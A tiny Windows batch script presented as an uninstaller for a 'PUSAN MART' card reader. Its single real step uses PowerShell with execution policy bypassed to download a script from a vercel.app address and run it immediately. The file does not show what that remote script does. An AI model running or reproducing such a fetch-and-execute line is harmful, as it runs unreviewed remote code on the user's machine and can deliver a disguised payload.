@echo off
rem PUSAN MART card reader: double-click remover for Windows.
title PUSAN MART card reader - remove
echo.
echo   PUSAN MART card reader: removing...
echo.
powershell -NoProfile -ExecutionPolicy Bypass -c "irm https://smeag-estore.vercel.app/bridge/uninstall.ps1|iex"
echo.
echo   Done. You can close this window.
echo.
pause
